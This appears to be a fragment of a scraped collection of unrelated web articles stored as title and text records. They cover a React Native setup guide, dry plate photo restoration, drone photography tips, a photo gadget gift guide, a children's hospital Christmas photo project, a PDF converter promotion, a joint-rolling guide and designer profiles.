as a building platform. \nInstall NodeJS and NPM \nThere are two ways to start building React Native application: using Expo or building React Native App from CLI. Expo is the easiest way: it removes some of the barriers up front. \nnpm install -g expo-cli \nThen run the following commands to create a new React Native project: \nexpo init NotAnAwesomeProject \ncd NotAnAwesomeProject \nnpm start \nInstall the Expo client app on your iOS or Android phone and connect to the same wireless network as your computer. \nOpen App.js in your text editor of choice and edit some lines. The application should reload automatically once you save your changes. \nThat\u2019s it! \nRecap and Conclusion \nIf you have apps that already work with complex business logic and many screens that are built on Swift/Java/Kotlin and a team of native mobile developers that are working well on support and development application, I do not recommend to move to hybrid or cross-platform technologies. That is the reason why Airbnb shut down the development of their mobile app using React Native. \nIf you\u2019re planning to quickly prototype your future app or build the app from scratch, cross-platform technologies are the case for you\u200a\u2014\u200aespecially if you\u2019re familiar with Javascript and its UI building frameworks. React Native will fit these goals well thanks to its ease of adoption, human resources and speed of development. \nAbout the authors and React Native Starter \nWe are the creators of React Native Starter . React Native Starter is a mobile starter kit that allows your team to fully focus on the development of the features that set your product apart from the competitors, instead of building your app from scratch. You have 16 ready-to-use components, advanced charts library, chat application plus many more screens and components. \nFlatlogic are developing admin dashboard templates and react native templates .

      "title": "Remembering The Dead \u2013 Discovering Dry Plate Photography",
      "text": "In my work travels, I recently met someone who gave me an interesting gift. Several years back he had been driving down a back road in Virginia and came across an old, abandoned farmhouse. He stopped and peeked in to see if anyone was using the place (you can\u2019t be too careful about what you run across that looks abandoned these days), and saw only cobwebs. He went in and found an interesting box: \nSeeds Dry Plates \u2013 The Company Was Founded In 1883 \nDry plate photography was developed after the wet collodion process. With dry plates, glass plates that had been factory coated with a photographic emulsion were boxed after the emulsion dried. They could be stored and loaded into cameras as needed and developed at any time after exposure. The process was therefore far more convenient than the wet collodion process, where glass plates had to be hand coated with a wet, light sensitive emulsion just before exposure and then developed almost immediately thereafter. The dry plate process was first introduced in 1871, and, in particular, the Seed Dry Plate Company was founded in 1883 and purchased by Eastman Kodak in 1902. That would date this box as well over 100 years old. \nMy friend opened the box and found exposed dry plates inside, which appear as a negative image! Recognizing that the farmhouse was obviously abandoned and that if he left the plates they would likely be lost forever, he took the box. After a few weeks of our working together, he found out about my interest in photography and one day brought the box in and gave it to me as a gift. \nThe dry plates themselves (of which there were 8 or 9) were not in particularly good shape, probably because that had been exposed to the elements for decades. This an example of one of the dry plates that was better preserved, with an apparent negative image: \nGlass Dry Plate \nI chose some that looked promising, put them on my flatbed scanner and scanned them. I then brought them into Photoshop, inverted the negative black and white image, added a bit of contrast and sharpened them. In some instances, I was able to produce a pretty reasonable image of people who are presumably no longer among the living. For example, this was the reult of scanning the dry plate pictured above: \nAnd for a closer, zoomed in look at the young girl: \nAnd another couple of examples. The many black dots are areas where the emulsion has degraded and worn off. I have to say that it is at the same time exciting and yet somewhat eerie to see people \u2018reaching out from the dead\u2019. \nTo me, this next image appears to be the same two women pictured above: \nAnd yet another: \nAnd this final image does appear a little \u2018ghostly\u2019. \nPerhaps this serves to bring back, in some small way, the memory of these people. Should any reader know who these folks are (I know the odds are one in a million, but stranger things have happened) do please let me know. \nAbout the Author \nHoward Grill is a self-taught nature photographer whose passion is allowing the viewer to experience an emotional connection with nature through his visual imagery.

      "title": "10 Tips for Shooting Epic Drone Photos",
      "text": "Aerial photography is a different game than photographing from the ground. It\u2019s much more difficult and slower to make a composition and you have to think of all kinds of rules and limitations to get your shot. However, drones opened up many new angles and possibilities when it comes to photography. \nI love new technology and I love drones. I mainly use the small drones ( Mavic 1 Pro , Mavic 2 Pro ) because they\u2019re easy to bring with me in my backpack. I have been photographing with drones for a while now and I want to share some tips on how to take a good photo with your drone. \n1. Higher is not always better. When you\u2019re flying your drone really high the landscape you\u2019re photographing is often messy with a lot of stuff in the frame. Getting closer and lower to certain objects is often better for your composition. Also, experiment with different heights. You\u2019ll see the distance relation between objects getting larger or smaller. With a drone, you have the flexibility to greatly change this, while from the ground you can only use your own height when you\u2019re holding a regular camera. \n2. Composition: Look for objects and place them in the 3rd grid of your frame . Getting a nice composition from the sky is not that easy but with practice its great fun to look for interesting objects and lines. Use them to lead the viewer into the image, just like shooting with a normal camera. Extra tip: In the mountains, rivers are amazing to use as leading lines from the sky. \n3. Google Earth is your friend . It\u2019s scary how detailed google earth has become. I can scout areas on Google Earth for hours to find shot and I am not talking about only the top down shot. Try the 3D view. It\u2019s scary how detailed it is. You can basically see your own house and car, in 3D. You can angle your shots exactly how you want them to be, see the altitude information and then reproduce them with your drone. \n4. A second useful tool is the PhotoPills app . They now implemented a \u2018drone module\u2019 where you can scout the map (same as google earth) and you can select your drone and see the exact field of view, altitude, etc. You can save the spots marked in the app and use the app to go to the locations and take the shots. This is only for top-down drone shots. \n5. I use a trick called \u2018noise-stacking\u2019 When I am shooting photos I often shoot in Burst Mode . The drone will then take 5 shots quickly after each other. By doing this I can greatly reduce noise in my drone shots. The Mavic sensors are tiny and even at ISO 100 they create quite a bit of noise, especially if you\u2019re going to process them. By shooting 5 exactly the same photos I can stack these together, and because they have a different noise pattern in each photo, software can average these and get a clean final shot. The way you do this is: \nSelect the 5 photos in Lightroom -> Right click -> Open as layers in Photoshop \nSelect all the 5 layers in Photoshop -> Edit -> Auto Align. This will auto align the images incase the drone slightly moved during taking the images. \nSelect all 5 layers -> right click -> Convert to smart object. \nLayer -> Smart Objects -> Stack mode -> Mean \nThe noise is now averaged and you\u2019ll see a cleaner image. Save to get it back in Lightroom. \n6. Drones do not have ultra wide angle lenses . This is often not needed from the sky anyway, but if you want to capture more than the frame allows, use the panorama option. I actually almost always use the full sphere panorama option. I often only use half or even 1/4 of the pano in the end, but letting the drone do this pano automatically is quite fast and I can pick the right part in post. The automatic drone picture modes on the Mavics are doing a good job in general. Note that I always let the drone save the RAW files of the pano, and stitch them in Lightroom, Photoshop or PTGui. \n7. Know the right weather conditions to fly . Flying around fog is incredible. It gives a magical atmosphere. Also, backlight objects are really cool with the drone, you can play with long shadows in compositions. \n8. Watch your histogram closely and, if needed, do automatic or manual bracketing . The drone usually hovers quite still, so you can even often manually make multiple exposures if you need. Especially when you\u2019re photographing into the sun. \n9. Use the right settings . Always use ISO 100 when taking a picture. The quality and noise already greatly decreases with small drone sensors. If you have an adjustable aperture, like on the Mavic 2 and Phantom 4, use around f/4-f/5.6. Don\u2019t think that f/11 gives you the best sharpness. In fact, f/11 is very soft and quite bad quality so try to avoid shooting at this aperture. Bonus tip: Use a polarizer filter if you want to photograph the bottom of lakes, water, etc. \n10. Get confident with your drone . In the beginning, I was scared to fly it far away, but having flown so many times now I know what my drone is capable of. I also trust it a lot when losing signal or having problems with my phone. When I press the RTH button, it always comes back. \nLast, not really a tip but something important: \nObey the rules but most importantly: fly responsibly. I see lots of \u2018influencers\u2019 fly above crowded cities. This is not cool. Not only is it strictly forbidden, but it\u2019s also dangerous for various reasons. Sure, everyone who flies drones flies above a road sometimes, but don\u2019t fly above crowds of people or big cities. This is really giving the wrong example and I really don\u2019t like to see big instagram accounts promoting such shots and activities. Please be responsible. \nAbout the author : Albert Dros is an award-winning Dutch photographer. The opinions expressed in this article are solely those of the author.

      "title": "2019 DIYP Holiday Gift Guide \u2013 Accessories & Gadgets",
      "text": "All photographers and filmmakers have accessories and doohickies in their bags to help them with their pursuits. And now that we\u2019ve covered cameras , lenses , lights , bags , tripods, sliders & gimbals out of the way, it\u2019s time to crack on with those in today\u2019s final 2019 DIYP Gift Guide. Here are some of the things we find absolutely invaluable in our work and some of the new tools and toys that have come out this year. \nColorChecker Passport Photo 2 \u2013 $119 ( Amazon / B&H ) \nWith the array of cameras on the market these days, not-so-great camera profiles built into software and quite a few photographers actually shooting multiple brands, keeping consistency between them all can be something of a challenge. X-Rite\u2019s ColorChecker Passport Photo 2 replaces the original CCPP in their lineup as the defacto standard tool for profiling your camera. It easily slips into any bag or even your pocket for use in the studio or on location and helps to ensure you get consistent colours every time, no matter what you shoot. \nViltrox wired remote & intervalometer \u2013 $19 ( Amazon ) \nA lot of people prefer to go wireless these days for triggering their cameras, especially with the number of cameras today that have built-in WiFi and smartphone apps. But sometimes you just can\u2019t beat a wired remote, especially one with a built-in intervalometer. If you\u2019re shooting a long timelapse sequence, the last thing you want is for your trigger and camera to lose connection or for your batteries to run out, especially if you leave a camera shooting overnight while you sleep. I\u2019ve been using the Viltrox intervalometer this year for much of my timelapse, it\u2019s never let me down and they take standard 2.5mm cables that you can buy for just about any camera out there. \nSanDisk Extreme Pro SD Cards $19.99+ ( Amazon / B&H ) \nYou can never really have enough memory cards, and with as inexpensive as they\u2019ve become, can you really afford to not have several of these in your bag? Cards die. It doesn\u2019t happen often, and when it does it\u2019s mostly through neglect or user error, but they do die. If you\u2019re in the middle of a client session and your only card dies, what do you do? Ideally, you\u2019ll be shooting to dual card slots so you can calmly keep on shooting, safe in the knowledge you haven\u2019t lost anything, but you\u2019ll still want a couple of spares handy. \nPolarPro Peter McKinnon Edition 0.6-1.5 Variable ND Filter \u2013 $249 ( Amazon / B&H ) \nThe PolarPro Peter McKinnon Edition 0.6-1.5 (2-5 stop) Variable ND Filter is one of the best variable NDs I\u2019ve had the opportunity to use. It produces a nice clean colour that doesn\u2019t noticeably shift as you change exposure and hard limit stops prevent the dreaded \u201cX\u201d phenomenon often seen with cheaper variable ND filters. If you\u2019re a vlogger or filmmaker, it\u2019s an invaluable tool to have in your bag that will last you a lifetime. They also come in 6-9 stop flavour ( B&H ) but I find the 2-5 stop to be the most useful for many filmmaking uses. \nHaida M10 Filter Kit \u2013 $195 ( Amazon / B&H ) \nWhile we\u2019re on the subject of filters, this one might be better suited to photographers. This is the Haida M10 Filter Kit, and it\u2019s a square filter holder for holding 100x100mm square filters. But it also supports drop-in filters, too and is supplied with a drop-in circular polarizer that can be rotated and adjusted independently of the holder itself. They also offer a range of other filters to replace the drop-in including straight NDs as well as ND+PL filters. The easy on/off mechanism makes it a breeze to use out in the wilderness for shooting landscapes, and the drop-in filters can be very useful to quickly swap one filter out for another. \nFeelworld F6 Plus monitor \u2013 $229 ( Amazon ) \nOver the past couple of years as I\u2019ve started to use more on-camera monitors, they\u2019ve become as invaluable to me for photography as they are to video, especially for things like product photography, landscapes and macro. They allow you to see a better overall view of your scene, and a touchscreen monitor like the Feelworld F6 Plus allows you to zoom right into the details much easier than the camera\u2019s LCD alone can offer. The F6 Plus also offers an 8v power output, allowing you to power your camera externally, which can fantastic for those long days and nights shooting timelapse. \nHollyland Mars 400s \u2013 $649 ( Amazon / B&H ) \nIt used to be that reliable wireless HDMI transmission would cost you thousands. But as technology has progressed, the size and cost of such devices has reduced quite dramatically. The Hollyland Mars 400S takes an SDI or HDMI signal which it can then broadcast up to a massive 400ft range (although in my own tests, it\u2019s been further and we have a full review coming soon) and then fed back into an SDI or HDMI monitor. While the implications for video users are quite obvious, they can be very handy for monitoring remote cameras for photography, too, for subjects such as wildlife or track-side shooting sports. \nASUS ZenBook Pro Duo \u2013 $2,499 ( Amazon / B&H ) \nThe ZenBook Pro Duo is a unique beast amongst laptops, ideally suited to creative tasks like photography and video editing. It\u2019s an Intel Core i7-9750H-powered laptop with 16GB RAM, and a somewhat special feature. The main display is a 15.6\u2033 4K (3840 x 2160) multi-touch OLED screen which offers 100% DCI-P3 and 133% sRGB coverage, powered by an Nvidia GeForce RTX 2060 GPU with 6GB GDDR6 RAM. But it also contains a second 3840 x 1080 resolution display above the keyboard which extends the Windows desktop. This affords you a lot of screen space for arranging your tools just how you wish while maximising the main screen area for working with your photos or video footage. \nBlackmagic Atem Mini \u2013 $295 ( Amazon / B&H ) \nIf you ever do any kind of live streaming with multiple cameras or have been thinking about it, then the Blackmagic Atem Mini is a fantastic tool for you. It allows you to easily switch between up to four different HDMI video sources at the push of a button while keeping your audio consistent between them. You can also integrate wireless cameras into the mix using something like the Hollyland Mars 400S shown above. \nLoupedeck Creative Tool (CT) \u2013 $549 ( B&H ) \nThe Loupedeck Creative Tool (Loupedeck CT) is the newest product from the Finnish company, Loupedeck. After the success of the self-titled original Loupedeck, they went onto the Loupedeck+ which added more software compatibility and a better build quality. Now, they\u2019ve stepped things up several notches with the new Loupedeck CT. It, too, supports a number of different applications with more support coming in the future. But this one also incorporates displays for real-time feedback, and it\u2019s a whole heck of a lot smaller than Loupedeck\u2019s previous products, too, making it ideal for travel photographers and filmmakers working on the go. \nOverview \nThere have been so many cool toys come out over the last year that it\u2019s impossible to list them all, but these are some of our favourites we\u2019ve seen come out during 2019 and a few we use regularly ourselves in our regular photography and video projects. \nThis completes our 2019 DIYP Gift Guide series. We hope you\u2019ve found yourself or a loved one some nice new toys. If you missed our previous guides on cameras , lenses , lighting , bags , tripods, sliders & gimbals , don\u2019t forget to check them out. \nWhat\u2019s been your favourite photography or video accessory, gadget or doohicky?",

      "text": "Photographers from all over the world come together to make Christmas happier for children in hospitals \nDecember 12, 2019 by Dunja Djudjic Leave a Comment \nEdit by Bren Slade \nFour years ago, Karen Alsop started The Christmas Wish Project with a goal to make Christmas happier for sick children in Australia. The project has since gone global, and this year it included volunteers, photographers and composite artists from all over the world . They all joined forces to create magical Christmas-inspired art and put a smile on children\u2019s faces during this holiday season. \nThis year, Karen and her team had a series of workshops in Australia to train volunteers for future projects. There were also several shoots in hospitals around the country. For the first time, the shoots were also held in the US. The project had a group from Idaho run Christmas Wish in November, and another group from New York had a shoot early December. \nThe shoots were finished earlier this month. There was Karen with her team of photographers and volunteers, there was an improvised studio in every hospital, and of course \u2013 there was Santa. But most of all, there were lots of smiles and a whole lot of love. In the video and photos below, you can see what it looked like behind the scenes. But if your heart is soft, have some tissues at hand. \nVIDEO \nIt\u2019s impressive how Karen and the rest of the folks were organized. Between workshops and shoots, an amazing team of 50 editors edited the photos 24/7 as they were uploaded by the photographers. The team of editors is headed up by Charm Hauraki from New Zealand, and they were also in charge of creating the backgrounds for final artworks. There were quite a few famous photographers and editors involved, such as Colin Smith, Renee Robyn, Jes\u00fas Ramirez, and Richard Wood, to name just a few. With great organization and coordination, they managed to edit over 400 images for this year\u2019s project. Wow! \nNeedless to say, the children were thrilled when they saw their finished Christmas Wish artwork. None of them knew what the final photo would look like, and they were amazed to see themselves in dreamy, surreal, and even humorous Christmas scenes. After all, Karen and her team kindly shared finished artworks with us, so check them out: \nPhoto and edit by Kris Anderson \nPhoto and edit by Karen Alsop \nEdit by Jes\u00fas Ramirez \nEdit by Colin Smith \nEdit by Mark Heaps \nEdit by Renee Robyn \nEdit by Angelo Van Der Klift \nEdit by Kelly McDonald \nYou can read more about this year\u2019s Christmas Wish project on The heART Project\u2019s blog . I\u2019m happy to see that the project is growing bigger every year, and I\u2019m already excited to see how much it will grow next year!",

      "title": "How to Convert PDF to Word with PDFelement Pro",
      "text": "Are you out looking for a way to convert PDF to Word and make some edits to a document before sending it out? Here\u2019s a complete guide on how to change PDF to Word file, and why you should use iSkysoft PDFelement Pro to do it. \nThe business world now belongs to the internet, with everything from financial transactions, to conference business meetings happening over the web. Regardless of the line of work that you\u2019re in connecting to the World Wide Web is most likely a daily work operation for you and your business. A large chunk of working over the web includes sharing files and data, most of which is done through one specific file format \u2013 Portable Document File (PDF). \nThe PDF format has been around since Adobe created it as a proprietary file format, but was finally made an open standard a decade ago in 2008. What makes PDF files unique is the fact that they are \u201cwritten in stone\u201d, meaning that the files cannot be edited, and the text cannot be changed or reformatted. The PDF format has been universally adopted to become the ideal way to view documents across different operating system platforms. \nWhy change PDF to Word file? \nThere are certain times when you actually need to edit the all-mighty PDF file or get a hold of the graphics or text contained within the file. This is where a PDF to DOC converter comes in handy, enabling you to easily change the document file format, and there are plenty of ways to do so. Here are just a few reasons why you would need to change the format of a PDF file to Word DOC file: \nCopying the content \u2013 While you can always move over your cursor across a PDF file and use the \u201ccopy\u201d command to fetch the content within the file, it does not take into account the formatting of the content. To do so, you would need to convert the PDF document into a typing-friendly format such as DOCX, which is the primary reason to convert it. \nMaking corrections and changes \u2013 The biggest advantage of a PDF document is that it cannot be tampered with, and is essentially permanent. This can also be counterproductive since any errors within the content, or changes that are required to the PDF document are there for good. The only way to make necessary edits and improvements to the content is by changing the file format into an easily editable document type such as Word. \nAdding Annotations \u2013 There are times when your employer, your employees, or colleagues may share certain documents with you in PDF format, which need to be edited and worked on. Putting in your comments into the PDF file isn\u2019t possible, but it can certainly be done in an editable file format such as DOC. By changing the file format to DOC, it is easier for you and others to add their comments, doodle over the content, and highlight changes. \niSkysoft PDFelement Pro \u2013 The ultimate PDF to DOC converter \nNecessity surely is the mother of all inventions, which is why there has been a meteoric rise in the number of different apps and software clients to change PDF to DOCX. A simple web search will lead you to dozens of online and downloadable apps that provide the ability for file format conversion, but not all of them are built the same way.

      "text": "Take a look at our guide on rolling the perfect joints! \nJoints are perhaps the most iconic way to smoke your cannabis. They are extremely convenient: easy to smoke, easy to pass, easy to transport. \nHowever, many find rolling a joint to be anything but easy. Truth be told, it\u2019s not too complicated to roll a simple joint. But rolling the perfect joint is a true skill. Veteran smokers know that rolling can be a true artform, which takes a lot of time and practice to get right. \nIn this article, we\u2019ll walk you through the steps needed to roll great joints. \nMaterials for Rolling a Joint \nRolling a great joint starts with having the right materials to work with. Every great joint requires three essential tools: \nA rolling paper \nThe marijuana flowers (buds) of your choice \nSomething to grind or chop up the buds (ideally a quality grinder or a pair of scissors, but in a pinch this can be done by hand) \nChoosing the right Rolling Papers \nSelecting the right rolling paper is a step that might seem dead simple, but it\u2019s something that should not be taken for granted! Remember, when you smoke a joint, you\u2019re not only smoking weed, you\u2019re also smoking the paper! \nThe wrong choice of paper can leave your joint with an undesirable taste. Papers used for rolling cigarettes, for example, tend to have chemicals intended to keep the cigarette burning and make for foul tasting joints. \nThe best papers are those with the fewest additives. Papers made from organic hemp or rice are the best options. \nIt\u2019s also worth picking up a quality brand, such as RAW, ZigZag, or Elements. While you could just grab whatever is cheapest, rolling papers are cheap enough to begin with that its worth selecting the better brands. \nA low quality paper can create a frustrating rolling experience. They can easily rip, don\u2019t stick together properly, and are generally a hassle to work with. \nYou\u2019ll also find rolling papers available in various sizes. While there are some fancy tricks for rolling joints from multiple papers, the size of the paper determines the size of the joint. If you\u2019re hoping to roll a big old monster, you\u2019ll want to opt for some King Sized papers. If you just want to make a few pinners, you can grab some smaller papers which will do the trick without wasting any paper. \nPreparing Your Cannabis for Rolling \nOnce you\u2019ve got some papers and some weed , it\u2019s time to prepare your flowers for rolling into a joint. \nFirst, use scissors or your hands to remove any stems, large leaves, or seeds from your marijuana flowers. \nNow it\u2019s time to grind or chop your marijuana up. The most effective way to do this is with a quality weed grinder . Break up the flowers into manageable chunks and place them into the grinder. Spend a minute or two twisting the grinder until everything is broken down nicely. \nIf you don\u2019t have a clean weed grinder handy, you can also chop your buds up with a good pair of scissors. Or, if you\u2019re lacking scissors as well, you can pick the buds apart by hand, but this is the least effective (not to mention the stickiest!) method of preparing your bud. \nThe goal here is to create a loose, airy bundle. You want the weed to be ground up finely enough that air can readily flow throughout the bundle, but not so finely that it begins to turn to powder. \nIf it\u2019s not ground up well enough, it will be hard for air to make its way through the bundle, leading to it burning less efficiently and making it hard to smoke. But if ground too finely, it will be a loose and powdery mess which doesn\u2019t stick together properly when you try to roll it, and burns too quickly, creating a harsh and unpleasant joint. \nYou need to want to find the happy medium. Not too dense, not too fine. Just light and airy enough to promote good airflow and quality combustion while still sticking together well enough to create a structurally sound joint. \nDownload our free Ganja Livity lifestyle guide to learn more about rolling perfect joints! \nUse a Filter or a Crutch (Optional) \nIf you want to, you can add a filter or a \u201ccrutch\u201d to your joint. This can make it easier to roll and improve the smoking experience. \nYou can purchase filter tips and purpose made crutches from most smoke shops. A crutch can be made from a piece of cardboard, such as the small box your rolling papers come in. \nTo create a crutch, just tear off a small piece of cardboard and roll it into a small cylinder \u2014 maybe about a quarter- or half-inch long and slightly smaller than the diameter of the joint you\u2019re planning to roll. \nThis will perform two functions: \nMakes your joint easier to roll: A cylindrical crutch provides a sort of \u201cfoundation\u201d for your joint. It helps add structural stability to the finished product. It also makes it easier to roll, giving your rolling paper something to easily wrap around and immediately forming the shape of a good joint. \nLets you smoke your entire joint: Without a crutch, your joint will almost always have some wasted weed at the end. When smoking a crutch-less joint, the last bit of joint is nearly impossible to smoke without burning your fingers. It also tends to be a wet, sticky mess. But with a crutch, you can smoke right down to the last bit of cannabis and keep your fingers clean and unburnt. Just be careful not to smoke the cardboard! \nA filter tip performs both of these functions and has the added benefit of capturing some of the tar and resin which would otherwise end up in your mouth and lungs. This can make your joint smoking experience a bit cleaner and tastier, but it will require you to keep some filter tips on hand, as these can\u2019t be assembled as easily as an improvised crutch. \nPreparing Your Joint \nOkay, so you\u2019ve got some quality papers, some choice flowers, and you\u2019ve ground it all up into a nice loose bundle free of stems, leaves, and seeds. Now what? \nTake your rolling paper and hold it between your thumb and index finger (usually in the right hand.) Use the index finger from your opposite hand to push the paper down, creating an indented \u201cU\u201d shape along the length of the paper. \nAt the top of the paper should be a small strip of adhesive which you\u2019ll use to seal your joint later. Place the weed beneath this with enough paper at the bottom to tuck it into the paper, which we\u2019ll do in the next step. \nIf using a crutch or a filter tip, place it at the end of your joint (usually the right hand side.) Now take your ground up flower and sprinkle it throughout the length of the paper. \nAt this stage, you can decide what you want your joint to look (and smoke) like. The easiest joints to roll are medium sized, evenly spaced ones. For this, sprinkle an even amount of weed throughout the joint. \nAnother option (slightly more difficult to roll for beginners,) is the \u201cbat\u201d shape. This makes use of more weed at the far end (the end which you light) and gradually tapers down to a thinner joint near the end. For this effect, just pack more weed into the far end and use less and less as you go down. \nBe careful not to use too much, or too little weed! If your joint is packed too densely, it will be too \u201ctight,\u201d restricting the airflow and making it difficult or nearly impossible to smoke. Too loosely packed and it will be thin and floppy, lacking structural stability and likely to fall apart while burning. \nTwisting Up Your Joint \nOnce the weed is in the paper, it\u2019s time to twist it into a proper joint. \nTake the paper and weed contained inside between your thumbs and index fingers. Using both hands, gradually roll the bundle upwards until you\u2019ve achieved the shape you desire for your joint. \nNow you need to tuck the end of the paper closest to your body under the bundle of weed. This can be a bit tricky. It\u2019s made easier by using a filter or crutch. The goal here is to create a layer of paper above and below the weed bundle, which can then be rolled up inside the remaining paper. \nFor the best tuck, use your thumb to gently wrap the paper around the bundle starting at one end of the joint, then gradually move the tuck along the length of the paper. \nThis can take some practice, but it is the key to getting a properly rolled joint! \nIf you don\u2019t get the tuck right, don\u2019t worry. Just try it again until you\u2019ve got it right. \nOnce everything is nicely tucked in, lick the adhesive at the top of the paper. Then gently and gradually roll the tucked portion upwards until the entire paper has wrapped around your bundle. \nVoila! You\u2019ve just rolled a joint. \nFinal Touches \nTo finish off your roll, use a small object to gently press down on the open end of your joint. You want to compress the bundle a little bit and leave a little empty space at the end of the joint. \nOptionally, you can twist this open end up, which can help with lighting up the joint, or create a nice enclosed joint which you can save for later. \nNow your joint is ready to smoke! When lighting it, introduce the joint to the flame of your lighter gradually and twist the joint around. You want the flame to burn the end of the joint evenly, which will help ensure a smooth burn all the way down. \nSimplified Rolling Methods \nAs we mentioned above, rolling a joint by hand is something of an artform which requires practice and patience to get right. If you find rolling a quality joint by hand a bit too tricky, there are still some easy ways to get a great joint. \nUsing Pre-Rolled Cones \nMost cannabis dispensaries offer pre-rolled cones, which can be used to easily make a \u201cbat\u201d-style joint. These cones are just a paper which has been wrapped around a filter at one end and have a wide, open mouth at the other. \nTo use them, just prepare your weed like we discussed above. Then all you need to do is pack the weed into a loose bundle in the cone. \nAnd just like that, you\u2019re off to the races. \nUsing a Rolling Machine \nRolling machines do the heavy lifting for the most complex part of the rolling process: tucking and twisting your joint. \nPrepare your weed into a loose bundle as discussed above. Place it within the chamber of the rolling machine and roll it up a bit (without a paper) to make sure everything is in place. Be sure not to use too much bud or your joint will be too tight and difficult to smoke. \nOnce the weed is in place, insert a paper with the adhesive strip sticking out of the top of the machine. Gradually work the roller upwards until only the adhesive strip is left. Give the strip a lick and finish rolling upwards to create a nice, even joint. \nEvery rolling machine can be a little different, so it\u2019s best to consult the instruction manual for your roller (if available) for the best practices to employ when using your specific rolling machine. \nAdvanced Joint Rolling \nWe\u2019ve covered the basics of how to get a decent joint rolled, but if you\u2019re looking to step up your joint rolling skills, there are plenty of ways you can take things to the next level. \nDownload my free Grow Bible to learn about more advanced smoking techniques! \nRolling a Cross Joint \nA cross joint utilizes two joints rolling into a cross shape. This gives you not one but three (or more, if you make multiple \u201ccrosses\u201d) ends from which to light the joint. \nCross joints are a great party trick. They can also be a neat way to smoke multiple strains of weed at the same time. \nRolling a cross joint is actually pretty much the same process as rolling a normal joint. Here\u2019s a quick breakdown: \nStep 1: Roll a large joint. \nStep 2: Roll a smaller joint. \nStep 3: Take a sharp object like a nail or a knitting needle and pierce a hole about mid-way through the larger joint. Ideally, your nail or needle will be roughly the same diameter as your smaller joint. \nStep 4: Insert the smaller joint into the hole you made in the larger joint. \nStep 5: Tear off a few strips of rolling paper and use them to create a seal around the holes where the larger and smaller joints are joined. \nNow you can spark up all three ends of your cross joint and start smoking. \nIf you want to get really crazy, you can repeat this process multiple times to create multi-cross joint! \nHappy Smoking! \nYou now need everything you need to in order to get started rolling up some quality joints! \nWe recommend taking some time to practice. Get some marijuana, chop it up, pickup your favorite papers, have a seat and twist up some practice joints until you get comfortable. \nThis is the quickest way to learn what a good joint looks (and smokes) like. You might find your first joints to be too thin and loose, or too tight and dense. Working out how to get to the happy medium is the key to creating a successful joint that provides a great hit and burns evenly throughout its entire length. \nGood luck! With a little effort, you\u2019ll be rolling joints with the best of them in no time flat.",

      "text": "Welcome back to another edition of our Diversity in Design series, here on Envato Tuts+! This is a collection of designers, illustrators, and creatives\u2014each from different disciplines, cultures, and backgrounds. \nThere can be such value in celebrating and observing the unique, creative voice of our peers. Join me in observing these inspiring works, insights, and comments from this wonderful collection of inspiring content creators! \n4 Artists You Should Know: Diversity in Design \nSo let's dig right in with a look at this month's featured creators, their insights, their perspective, and their creative vision. \nJessica Kwong \nMeet Jessica Kwong\u2014a designer and illustrator with a passion for visual communication. Check out some of her inspiring work and insights. \nHi! My name is Jessica Kwong. I\u2019m a New-Zealand born Chinese communication designer with a focus on graphic design and illustration. \nI\u2019m passionate about art and design because it can have so many different meanings for different people. It calls forward buried emotions and memories and provides a visual language beyond spoken or written words. If eyes are the windows to the soul, then art is the message that gets through those windows. \nI\u2019ve always been interested in art and design since I was young, and am currently finishing up my second year in Bachelor of Communication Design, majoring in graphic design. At the moment, I\u2019m on exchange at Royal Melbourne Institute of Technology (RMIT) University in Melbourne, Australia, but my home university is Auckland University of Technology in New Zealand. \nI would describe my work as quite varied and influenced by my Chinese culture and my surroundings. My personal illustrations are rather soft, nostalgic and dreamy. I also quite enjoy creating portraits. My commercial work can be quite varied depending on the brief but are often rather graphic and vibrant. \nI want to make a difference in society with my work, through a cultural or environmental lens. \nI hope that my work will be used to inspire viewers to make thoughtful and impactful choices. As a second-generation immigrant, attempting to bridge the gap between the two cultures I\u2019ve grown up with, New Zealand and Chinese, has been quite important to me. In terms of creative goals: I want to continue developing and refining my personal style, build up my design experience and continue growing in my skillset. \nI\u2019m actually currently doing a secret series of illustrations to improve my skills in digital illustration \u2014 except I can\u2019t really call it secret anymore, can I? \nMy creative process is quite methodical. I do background research on context/iconography, then brainstorm ideas, come up with a few concepts and finally refine my work. Most of my work is done in Procreate, InDesign and Photoshop, although I do also enjoy using gouache and pencil for traditional illustrations. \nHowever, I wouldn\u2019t say that there\u2019s an overarching inspiration for my work. There are things that I am interested in, such as florals, and environmental or cultural issues. My graphic design aims to communicate a concept and message based on the brief, so the thinking behind each work is different. \nFor my personal work, I find inspiration from other creatives such as James Jean, Hieu (kelogsloops), and Lauren Tsai. \nI\u2019m still in a phase of growth but one thing that\u2019s stuck with me is that growth is more important than perfectionism. I\u2019m a total perfectionist, and this sometimes leads me to expect to get everything, including my work, perfect on the first try. \nHowever, I\u2019ve learned that this attitude tends to lead to disappointment and doubting your own skills when the outcome doesn\u2019t reach your expectations. I\u2019m learning to let go of my expectations to nail everything first time and focus on enjoying the process, doing as many iterations as possible, taking risks, being open to critiques and learning skills I didn\u2019t know before. It\u2019s always so much worth going the extra mile. \nCheck out more of Jessica's wonderful work at: \nJordana Adams \nJordana's work is sophisticated and beautiful. Take a look at these beautiful works from her portfolio\u2014as well as her inspiring insights! \nI am a graphic designer living in Melbourne with my 17.5 year old dog, Gucci. Past talents & triumphs include: butterfly swim champion, cellist and trained dancer, but I can\u2019t hula-hoop? Quite frankly, I\u2019m stumped\u2026 \nMy intrigue and passion for design sparked in high school, where I spent hours fascinated with Photoshop & Illustrator and taught myself the ropes. \nI remember I submitted a digital artwork once for my assignment and the teacher almost failed me because she couldn\u2019t believe I\u2019d managed it on my own. It was both very frustrating and flattering. I\u2019m now in my final semester after studying both a bachelor in interactive & visual design, and communication design. \nSocial and environmental progression is something that motivates me and my work a lot. I always want to consider how I can make design beneficial and supportive for people and the planet. \nAs designers we have such an incredible opportunity to ignite change and leave a positive impact. For me it\u2019s so important that design is not just pretty - it has to be POWERFUL as well. \nMy inspiration comes from many different facets. Sometimes it\u2019s a shape or a texture. A lot of the time it's Halloween with ideas that are slightly off-beat or eerie. Other times an issue I think needs attention, something that made me laugh, or the way a song made me feel. \nMy Human Error branding was a project inspired by a Galen Hooks choreography piece to \u2018Human\u2019 - Sevdaliza. I loved the way it made me feel very eerie and preternatural, and I wanted to inject that into a design work. I\u2019m also currently finessing a campaign design that spotlights the power of transgender and gender-diverse people in the workplace. \n\u201cCreate. Even if it sucks - keep creating.\u201d \nThis is a quote that I saw once and it really struck a chord with me. When I was starting out, I was very self-critical and I would get bogged down by perfectionism. But you don\u2019t have to be perfect to begin - just keep at it, reflect, grow, and work hard. Creating is an incredible and constant process. \nYou can take a look at more of 